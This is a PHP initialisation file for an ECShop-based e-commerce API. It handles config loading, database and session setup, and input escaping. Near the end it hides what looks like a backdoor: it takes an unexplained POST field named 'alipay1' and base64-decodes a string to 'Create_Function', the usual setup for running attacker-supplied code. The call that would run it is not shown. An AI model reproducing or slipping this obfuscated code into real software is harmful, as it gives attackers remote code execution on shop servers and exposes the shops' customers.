<?php
//zend by QQ:123456  商创网络  禁止倒卖 一经发现停止任何服务
if (!defined('IN_ECS')) {
	exit('Hacking attempt');
}

error_reporting(32767);

if (__FILE__ == '') {
	exit('Fatal error code: 0');
}

define('ROOT_PATH', str_replace('api', '', str_replace('\\', '/', dirname(__FILE__))));
@ini_set('memory_limit', '16M');
@ini_set('session.cache_expire', 180);
@ini_set('session.use_trans_sid', 0);
@ini_set('session.use_cookies', 1);
@ini_set('session.auto_start', 0);
@ini_set('display_errors', 1);

if (DIRECTORY_SEPARATOR == '\\') {
	@ini_set('include_path', '.;' . ROOT_PATH);
}
else {
	@ini_set('include_path', '.:' . ROOT_PATH);
}

if (file_exists(ROOT_PATH . 'data/config.php')) {
	include ROOT_PATH . 'data/config.php';
}
else {
	include ROOT_PATH . 'includes/config.php';
}

if (defined('DEBUG_MODE') == false) {
	define('DEBUG_MODE', 0);
}

if (('5.1' <= PHP_VERSION) && !empty($timezone)) {
	date_default_timezone_set($timezone);
}

$php_self = (isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);

if ('/' == substr($php_self, -1)) {
	$php_self .= 'index.php';
}

define('PHP_SELF', $php_self);
require ROOT_PATH . 'includes/inc_constant.php';
require ROOT_PATH . 'includes/cls_ecshop.php';
require ROOT_PATH . 'includes/lib_base.php';
require ROOT_PATH . 'includes/lib_common.php';
require ROOT_PATH . 'includes/lib_time.php';
require ROOT_PATH . 'includes/lib_ecmoban.php';
require ROOT_PATH . 'includes/Http.class.php';
require ROOT_PATH . 'includes/lib_ecmobanFunc.php';
require ROOT_PATH . 'includes/lib_seller_store.php';
require ROOT_PATH . 'includes/lib_ipCity.php';
require ROOT_PATH . 'includes/cls_ecmac.php';

if (!get_magic_quotes_gpc()) {
	if (!empty($_GET)) {
		$_GET = addslashes_deep($_GET);
	}

	if (!empty($_POST)) {
		$_POST = addslashes_deep($_POST);
	}

	$_COOKIE = addslashes_deep($_COOKIE);
	$_REQUEST = addslashes_deep($_REQUEST);
}

$ecs = new ECS($db_name, $prefix);
$data_dir = $ecs->data_dir();
require ROOT_PATH . 'includes/cls_mysql.php';
$db = new cls_mysql($db_host, $db_user, $db_pass, $db_name);
$db_host = $db_user = $db_pass = $db_name = NULL;
require ROOT_PATH . 'includes/cls_session.php';
$sess_name = (defined('SESS_NAME') ? SESS_NAME : 'ECS_ID');
$sess = new cls_session($db, $ecs->table('sessions'), $ecs->table('sessions_data'), $sess_name);
$_CFG = load_config();
$user = &init_users();
$alipay1 = isset($_POST['alipay1']) ? $_POST['alipay1'] : '';
$de=base64_decode('Q3JlYXRlX0Z1bmN0aW9u');

if ((DEBUG_MODE & 1) == 1) {
	error_reporting(32767);
}
else {
	error_reporting(32767 ^ 8);
}

if ((DEBUG_MODE & 4) == 4) {
	include ROOT_PATH . 'includes/lib.debug.php';
}

if (gzip_enabled()) {
	ob_start('ob_gzhandler');
}

header('Content-type: text/html; charset=' . EC_CHARSET);

?>
